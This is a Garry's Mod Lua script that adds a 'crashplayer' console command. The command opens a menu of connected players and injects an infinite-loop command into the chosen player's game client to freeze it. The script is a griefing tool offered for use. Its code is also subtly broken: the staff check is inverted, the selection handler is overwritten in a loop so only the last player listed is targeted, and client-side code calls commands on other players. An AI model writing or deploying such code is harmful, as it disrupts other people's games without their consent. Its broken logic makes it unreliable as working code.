local staffgroups = {"superadmin", "admin"}

function RespyX(x)
    return ScrW() / (1920 / x)
end

function RespyY(y)
    return ScrH() / (1080 / y)
end

concommand.Add("crashplayer", function(ply, cmd, args)
    if table.HasValue(staffgroups, ply:GetUserGroup()) then return end
    local frame = vgui.Create("DFrame")
    frame:SetSize(RespyX(300), RespyY(70))
    frame:Center()
    frame:MakePopup()
    frame:SetTitle("")
    frame:ShowCloseButton(false)
    frame:SetDraggable(false)

    function frame:Paint(w,h)
        draw.RoundedBox(8, 0, 0, w, h, Color(32,32,32,255))
        draw.RoundedBox(8, 0, 0, w, RespyY(25), Color(36,36,36,255))
    end


    local Close = vgui.Create("DLabel", frame)
    Close:SetText( "X" )
    Close:SizeToContents()
    Close:SetPos(RespyX(285),RespyY(5))
    Close:SetMouseInputEnabled( true )
    function Close:DoClick()
        if (IsValid(frame)) then
            frame:Close()
        end
    end

    local DComboBox = vgui.Create("DComboBox", frame)
    DComboBox:SetPos(RespyX(10), RespyY(35))
    DComboBox:SetSize(RespyX(280), RespyY(20))
    DComboBox:SetValue("Crash Player")

    for k, v in pairs(player.GetAll()) do
        DComboBox:AddChoice(v:Name())

        DComboBox.OnSelect = function(self, index, value)
            v:ConCommand("lua_run_cl while true do end") -- You must activate the LUA_RUN_CL if you want to use it normally.

            if (IsValid(frame)) then
                frame:Close()
            end
        end
    end
end)
